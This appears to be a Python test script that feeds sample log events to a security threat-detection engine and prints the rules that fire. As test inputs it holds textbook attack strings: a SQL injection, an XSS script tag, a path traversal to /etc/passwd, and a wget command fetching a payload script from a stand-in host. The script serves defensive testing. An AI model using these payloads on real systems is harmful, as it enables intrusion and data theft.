from app.services.detection_engine import detect_threats


def print_results(test_name, results):
    print()
    print("=" * 60)
    print(test_name)
    print("=" * 60)

    if not results:
        print("No threats detected.")
        return

    for result in results:
        print(f"Rule:       {result.rule_name}")
        print(f"Severity:   {result.severity}")
        print(f"Title:      {result.title}")
        print(f"Confidence: {result.confidence}")
        print(f"Description: {result.description}")
        print("-" * 60)


# 1. Failed login + admin account
results = detect_threats(
    source="ssh-server",
    source_ip="192.168.1.50",
    event_type="login_failed",
    username="admin",
    message="Failed password for admin",
)

print_results(
    "TEST 1 - Failed Login + Admin Account",
    results
)


# 2. SQL Injection
results = detect_threats(
    source="web-server",
    source_ip="10.0.0.25",
    event_type="http_request",
    username=None,
    message="' OR 1=1 --",
)

print_results(
    "TEST 2 - SQL Injection",
    results
)


# 3. XSS
results = detect_threats(
    source="web-server",
    source_ip="10.0.0.25",
    event_type="http_request",
    username=None,
    message="<script>alert(1)</script>",
)

print_results(
    "TEST 3 - XSS",
    results
)


# 4. Path Traversal
results = detect_threats(
    source="web-server",
    source_ip="10.0.0.25",
    event_type="http_request",
    username=None,
    message="GET ../../etc/passwd",
)

print_results(
    "TEST 4 - Path Traversal",
    results
)


# 5. Suspicious command
results = detect_threats(
    source="linux-server",
    source_ip="10.0.0.31",
    event_type="command_execution",
    username="user",
    message="wget http://example.com/payload.sh",
)

print_results(
    "TEST 5 - Suspicious Command",
    results
)